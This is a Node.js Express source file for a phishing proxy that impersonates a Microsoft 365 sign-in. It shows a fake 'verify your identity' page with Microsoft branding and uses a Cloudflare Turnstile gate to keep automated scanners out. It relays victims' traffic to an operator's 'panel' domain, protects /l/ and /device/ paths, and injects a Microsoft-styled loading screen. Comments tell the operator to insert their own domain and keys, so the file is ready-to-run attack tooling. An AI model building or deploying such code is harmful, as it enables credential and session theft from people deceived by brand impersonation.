const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const app = express();
const port = process.env.PORT || 3000;

// ⚠️ CHANGE THIS TO YOUR PANEL DOMAIN
const PANEL_DOMAIN = 'portal42-343.sbs';

// ⚠️ CLOUDFLARE TURNSTILE KEYS (get from Cloudflare)
const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm';  // Replace with your site key
const TURNSTILE_SECRET = '0x4AAAAAAA...';   // Replace with your secret key

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(cookieParser());

function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

function requireCaptcha(req, res, next) {
    const token = req.cookies.captcha_token;
    if (token && token === req.cookies.captcha_verified) {
        return next();
    }
    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
}

// CAPTCHA Page with Microsoft Logo
app.get('/captcha', (req, res) => {
    const returnUrl = req.query.return || '/';
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verify your identity</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .box { background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 440px; width: 100%; padding: 40px 30px; text-align: center; }
        .logo { display: flex; justify-content: center; align-items: center; margin-bottom: 30px; }
        .logo svg { width: 36px; height: 36px; margin-right: 12px; }
        .logo span { font-size: 22px; font-weight: 600; color: #1a1a1a; }
        .subtitle { font-size: 16px; color: #5e5e5e; margin-bottom: 25px; }
        .footer { font-size: 12px; color: #6c6c6c; margin-top: 30px; border-top: 1px solid #e1e1e1; padding-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">
            <svg viewBox="0 0 23 23" xmlns="http://www.w3.org/2000/svg">
                <rect x="0" y="0" width="10" height="10" fill="#F25022"/>
                <rect x="12" y="0" width="10" height="10" fill="#7FBA00"/>
                <rect x="0" y="12" width="10" height="10" fill="#00A4EF"/>
                <rect x="12" y="12" width="10" height="10" fill="#FFB900"/>
            </svg>
            <span>Microsoft 365</span>
        </div>
        <div class="subtitle">Verify your identity to access this document.</div>
        <div class="cf-turnstile" data-sitekey="${TURNSTILE_SITEKEY}" data-callback="onCaptchaSuccess"></div>
        <div id="error" style="color:red;display:none;">Verification failed. Try again.</div>
        <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
    </div>
    <script>
        function onCaptchaSuccess(token) {
            fetch('/verify-captcha', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token: token, returnUrl: '${returnUrl}' })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) window.location.href = data.redirect;
                else { document.getElementById('error').style.display = 'block'; turnstile.reset(); }
            });
        }
    </script>
</body>
</html>
    `);
});

app.post('/verify-captcha', async (req, res) => {
    const { token, returnUrl } = req.body;
    if (!token) return res.json({ success: false });
    try {
        const form = new URLSearchParams();
        form.append('secret', TURNSTILE_SECRET);
        form.append('response', token);
        const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', { method: 'POST', body: form });
        const data = await r.json();
        if (data.success) {
            const t = generateToken();
            res.cookie('captcha_token', t, { maxAge: 3600000, httpOnly: true, secure: true });
            res.cookie('captcha_verified', t, { maxAge: 3600000, httpOnly: true, secure: true });
            return res.json({ success: true, redirect: returnUrl || '/' });
        }
        return res.json({ success: false });
    } catch (e) {
        return res.json({ success: false });
    }
});

// Protect /l/* and /device/* with CAPTCHA
app.use('/l/*', requireCaptcha);
app.use('/device/*', requireCaptcha);

// Main Proxy
app.use('*', async (req, res) => {
    try {
        const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
        const headers = new Headers(req.headers);
        headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        headers.delete('host');

        const opts = { method: req.method, headers: headers };
        if (req.method !== 'GET' && req.method !== 'HEAD') opts.body = req.body;

        const response = await fetch(targetUrl.toString(), opts);
        let body = await response.text();
        const contentType = response.headers.get('content-type') || '';

        if (contentType.includes('text/html') && !targetUrl.pathname.includes('.json')) {
            const loadingHTML = `
            <div style="position:fixed;top:0;left:0;right:0;bottom:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;" id="m365loader">
              <div style="margin-bottom:30px;display:flex;align-items:center;gap:12px;">
                <svg width="36" height="36" viewBox="0 0 23 23"><rect x="0" y="0" width="10" height="10" fill="#F25022"/><rect x="12" y="0" width="10" height="10" fill="#7FBA00"/><rect x="0" y="12" width="10" height="10" fill="#00A4EF"/><rect x="12" y="12" width="10" height="10" fill="#FFB900"/></svg>
                <span style="font-size:22px;font-weight:600;color:#1a1a1a;">Microsoft 365</span>
              </div>
              <div style="margin-bottom:20px;">
                <svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" fill="none" stroke="#E1E1E1" stroke-width="4"/><circle cx="25" cy="25" r="20" fill="none" stroke="#0078D4" stroke-width="4" stroke-dasharray="31.4 94.2" stroke-linecap="round" transform="rotate(-90 25 25)"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1.2s" repeatCount="indefinite"/></circle></svg>
              </div>
              <div style="font-size:15px;color:#5e5e5e;">Loading</div>
              <style>
                @keyframes dotBounce { 0%,80%,100%{transform:scale(0.6);opacity:0.4;}40%{transform:scale(1);opacity:1;} }
              </style>
            </div>
            <script>
              setTimeout(function(){ var l=document.getElementById('m365loader'); if(l){ l.style.transition='opacity 0.6s'; l.style.opacity='0'; setTimeout(function(){ l.style.display='none'; },650); } },2800);
            </script>
            `;
            if (body.includes('</body>')) body = body.replace('</body>', loadingHTML + '</body>');
            else body = loadingHTML + body;
        }

        res.status(response.status).set('Content-Type', contentType).send(body);
    } catch (e) {
        res.status(500).send('Proxy Error');
    }
});

app.listen(port, () => console.log(`✅ Proxy running on port ${port}`));
